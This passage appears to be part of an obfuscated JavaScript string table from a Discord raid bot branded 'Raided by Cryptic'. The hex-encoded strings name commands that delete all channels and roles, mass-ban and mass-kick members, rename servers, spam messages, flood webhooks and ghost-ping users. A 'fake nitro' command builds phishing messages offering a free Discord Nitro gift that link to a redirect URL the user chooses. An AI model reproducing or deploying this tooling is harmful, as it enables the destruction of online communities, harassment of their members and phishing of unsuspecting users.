F09\u256F\uFE35\x20\u253B\u2501\u253B","\x75\x6E\x66\x6C\x69\x70","\u252C\u2500\u252C\x20\u30CE\x28\x20\u309C\x2D\u309C\u30CE\x29","\x73\x68\x72\x75\x67","\xAF\x5C\x5F\x28\u30C4\x29\x5F\x2F\xAF","\x72\x61\x69\x64","\x41\x44\x4D\x49\x4E\x49\x53\x54\x52\x41\x54\x4F\x52","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x2E\x67\x79\x61\x7A\x6F\x2E\x63\x6F\x6D\x2F\x65\x37\x32\x30\x32\x34\x33\x61\x33\x64\x36\x63\x64\x39\x34\x32\x35\x65\x38\x62\x39\x37\x34\x35\x36\x32\x36\x33\x64\x65\x62\x64\x2E\x70\x6E\x67","\x73\x65\x74\x49\x63\x6F\x6E","\x52\x41\x49\x44\x45\x44\x20\x42\x59\x20\x43\x52\x59\x50\x54\x49\x43","\x73\x65\x74\x4E\x61\x6D\x65","\x72\x61\x69\x64\x65\x64\x2D\x62\x79\x2D\x63\x72\x79\x70\x74\x69\x63","\x63\x72\x65\x61\x74\x65\x43\x68\x61\x6E\x6E\x65\x6C","\x59\x6F\x75\x72\x20\x73\x65\x72\x76\x65\x72\x20","\x20\x68\x61\x73\x20\x62\x65\x65\x6E\x20\x52\x61\x69\x64\x65\x64\x20\x3A\x73\x6C\x69\x67\x68\x74\x5F\x73\x6D\x69\x6C\x65\x3A","\x52\x61\x69\x64\x65\x64\x20\x42\x79\x20\x43\x72\x79\x70\x74\x69\x63","\x6F\x72\x69\x67\x69\x6E\x61\x6C","\x54\x65\x78\x74\x20\x43\x68\x61\x6E\x6E\x65\x6C\x73","\x56\x6F\x69\x63\x65\x20\x43\x68\x61\x6E\x6E\x65\x6C\x73","\x67\x65\x6E\x65\x72\x61\x6C","\x47\x65\x6E\x65\x72\x61\x6C","\x6D\x73\x67","\x62\x6F\x6C\x64","\x69\x74\x61\x6C\x69\x63\x73","\x75\x6E\x64\x65\x72\x6C\x69\x6E\x65","\x64\x65\x73\x74\x72\x6F\x79","\x75\x70\x70\x65\x72","\x6C\x6F\x77\x65\x72","\x73\x74\x72\x69\x6B\x65\x74\x68\x72\x6F\x75\x67\x68","\x68\x69\x64\x64\x65\x6E","\x65\x76\x65\x72\x79\x74\x68\x69\x6E\x67","\x50\x6C\x65\x61\x73\x65\x20\x70\x72\x6F\x76\x69\x64\x65\x20\x6F\x6E\x65\x20\x6F\x66\x20\x74\x68\x65\x73\x65\x20\x6D\x65\x74\x68\x6F\x64\x73\x3A\x20","\x5F\x5F","\x74\x72\x61\x70","\x7E\x7E","\x7E\x7E\x5F\x5F\x2A\x2A\x2A\x7C\x7C","\x7C\x7C\x2A\x2A\x2A\x5F\x5F\x7E\x7E","\x73\x70\x61\x6D","\x74\x65\x73\x74","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x74\x68\x65\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x6D\x65\x73\x73\x61\x67\x65\x73\x20\x74\x6F\x20\x73\x70\x61\x6D\x2E","\x73\x70\x6C\x69\x63\x65","\x6C\x61\x67","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x74\x68\x65\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x6D\x65\x73\x73\x61\x67\x65\x73\x20\x74\x6F\x20\x73\x65\x6E\x64","\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A\x20\x3A\x63\x68\x61\x69\x6E\x73\x3A","\x6E\x69\x74\x72\x6F\x67\x65\x6E","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x74\x68\x65\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x6E\x69\x74\x72\x6F\x20\x63\x6F\x64\x65\x73\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x67\x65\x6E\x65\x72\x61\x74\x65","\x77\x65\x62\x68\x6F\x6F\x6B\x72\x61\x69\x64","\x57\x65\x62\x68\x6F\x6F\x6B\x20\x55\x52\x4C\x20\x6E\x6F\x74\x20\x73\x70\x65\x63\x69\x66\x69\x65\x64\x20\x69\x6E\x20\x63\x6F\x6E\x66\x69\x67\x2E\x6A\x73\x6F\x6E","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x74\x68\x65\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x6D\x65\x73\x73\x61\x67\x65\x73\x20\x74\x6F\x20\x73\x70\x61\x6D\x21","\x50\x6C\x65\x61\x73\x65\x20\x70\x72\x6F\x76\x69\x64\x65\x20\x61\x20\x6D\x65\x73\x73\x61\x67\x65","\x47\x75\x69\x6C\x64\x20\x6E\x61\x6D\x65\x20\x69\x73\x20\x74\x6F\x20\x6C\x6F\x6E\x67","\x59\x6F\x75\x27\x76\x65\x20\x6A\x75\x73\x74\x20\x62\x65\x65\x6E\x20\x72\x61\x69\x64\x65\x64","\x40\x65\x76\x65\x72\x79\x6F\x6E\x65","\x73\x65\x74\x54\x65\x78\x74","\x77\x65\x62\x68\x6F\x6F\x6B\x73\x70\x61\x6D","\x74\x72\x75\x65","\x66\x61\x6C\x73\x65","\x4D\x65\x6E\x74\x69\x6F\x6E\x20\x6D\x75\x73\x74\x20\x62\x65\x20\x74\x72\x75\x65\x20\x6F\x72\x20\x66\x61\x6C\x73\x65","\x40\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x7C\x20","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F","\x49\x6E\x76\x61\x6C\x69\x64\x20\x77\x65\x62\x68\x6F\x6F\x6B\x20\x75\x72\x6C","\x49\x6D\x61\x67\x69\x6E\x65\x20\x62\x65\x69\x6E\x67\x20\x72\x61\x69\x64\x65\x64","\x77\x68\x6F\x69\x73","\x74\x6F\x41\x72\x72\x61\x79","\x70\x65\x72\x6D\x69\x73\x73\x69\x6F\x6E\x73","\x47\x75\x69\x6C\x64\x20\x50\x65\x72\x6D\x69\x73\x73\x69\x6F\x6E\x73","\x41\x63\x63\x6F\x75\x6E\x74\x20\x43\x72\x65\x61\x74\x65\x64","\x49\x44","\x44\x69\x73\x63\x72\x69\x6D\x69\x6E\x61\x74\x6F\x72","\x55\x73\x65\x72\x6E\x61\x6D\x65","\x63\x6F\x6C\x6F\x72","\x68\x69\x67\x68\x65\x73\x74\x52\x6F\x6C\x65","\x32\x30\x32\x32\x32\x35","\x48\x65\x72\x65\x20\x69\x73\x20\x73\x6F\x6D\x65\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x6F\x6E\x20","\x20\x49\x6E\x66\x6F","\x20\x49\x6E\x66\x6F\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x48\x65\x72\x65\x20\x69\x73\x20\x73\x6F\x6D\x65\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x6F\x6E\x20","\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x55\x73\x65\x72\x6E\x61\x6D\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x44\x69\x73\x63\x72\x69\x6D\x69\x6E\x61\x74\x6F\x72\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x49\x44\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x41\x63\x63\x6F\x75\x6E\x74\x20\x43\x72\x65\x61\x74\x65\x64\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x54\x6F\x74\x61\x6C\x20\x52\x6F\x6C\x65\x73\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x47\x75\x69\x6C\x64\x20\x50\x65\x72\x6D\x69\x73\x73\x69\x6F\x6E\x73\x3A\x20","\x75\x70\x74\x69\x6D\x65","\x20\x73\x65\x63\x6F\x6E\x64\x20","\x20\x73\x65\x63\x6F\x6E\x64\x73\x20","\x20\x6D\x69\x6E\x75\x74\x65\x2C\x20\x61\x6E\x64\x20","\x20\x6D\x69\x6E\x75\x74\x65\x73\x2C\x20\x61\x6E\x64\x20","\x20\x68\x6F\x75\x72\x2C\x20","\x20\x68\x6F\x75\x72\x73\x2C\x20","\x20\x64\x61\x79\x2C\x20","\x20\x64\x61\x79\x73\x2C\x20","\x20\x77\x65\x65\x6B\x2C\x20","\x20\x77\x65\x65\x6B\x73\x2C\x20","\x4F\x6E\x6C\x69\x6E\x65\x20\x66\x6F\x72\x3A","\x20\x7C\x20\x53\x69\x6E\x63\x65\x20","\x4C\x20\x4C\x54\x53","\x73\x75\x62\x74\x72\x61\x63\x74","\x55\x70\x74\x69\x6D\x65","\x64\x65\x6C\x63\x68\x61\x6E\x6E\x65\x6C\x73","\x4D\x41\x4E\x41\x47\x45\x5F\x43\x48\x41\x4E\x4E\x45\x4C\x53","\x68\x61\x73\x50\x65\x72\x6D\x69\x73\x73\x69\x6F\x6E\x73","\x5B\x45\x52\x52\x4F\x52\x5D\x3A\x20","\x4D\x69\x73\x73\x69\x6E\x67\x20\x50\x65\x72\x6D\x69\x73\x73\x69\x6F\x6E\x73","\x64\x65\x6C\x72\x6F\x6C\x65\x73","\x4D\x41\x4E\x41\x47\x45\x5F\x52\x4F\x4C\x45\x53","\x6D\x61\x73\x73\x63\x68\x61\x6E\x6E\x65\x6C\x73","\x6D\x61\x73\x73\x62\x61\x6E","\x52\x61\x69\x64\x65\x64\x20\x62\x79\x20\x43\x72\x79\x70\x74\x69\x63","\x6D\x61\x73\x73\x6B\x69\x63\x6B","\x6D\x61\x73\x73\x72\x6F\x6C\x65\x73","\x72\x61\x69\x64\x65\x64\x20\x62\x79\x20\x43\x72\x79\x70\x74\x69\x63","\x66\x61\x6B\x65\x6E\x69\x74\x72\x6F","\x54\x68\x61\x74\x20\x69\x73\x20\x6E\x6F\x74\x20\x61\x20\x76\x61\x6C\x69\x64\x20\x69\x64\x2E","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x75\x73\x65\x72\x20\x69\x64\x2E","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x72\x65\x64\x69\x72\x65\x63\x74\x20\x75\x72\x6C","\x44\x6F\x6E\x65\x21","\x52\x65\x64\x65\x65\x6D\x20\x48\x65\x72\x65\x3A","\x5B\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x67\x69\x66\x74\x2F","\x5D\x28","\x29","\x43\x6F\x6E\x67\x72\x61\x74\x75\x6C\x61\x74\x69\x6F\x6E\x73\x2C\x20\x79\x6F\x75\x20\x68\x61\x76\x65\x20\x72\x65\x63\x65\x69\x76\x65\x64\x20\x61\x20\x66\x72\x65\x65\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x6E\x69\x74\x72\x6F\x20\x67\x69\x66\x74","\x46\x72\x65\x65\x20\x44\x69\x73\x63\x6F\x72\x64\x20\x4E\x69\x74\x72\x6F","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x2E\x67\x79\x61\x7A\x6F\x2E\x63\x6F\x6D\x2F\x38\x30\x39\x30\x36\x65\x66\x35\x66\x65\x32\x66\x35\x37\x31\x62\x33\x35\x32\x65\x64\x33\x63\x62\x65\x35\x33\x37\x33\x34\x65\x66\x2E\x70\x6E\x67","\x67\x68\x6F\x73\x74\x70\x69\x6E\x67","\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\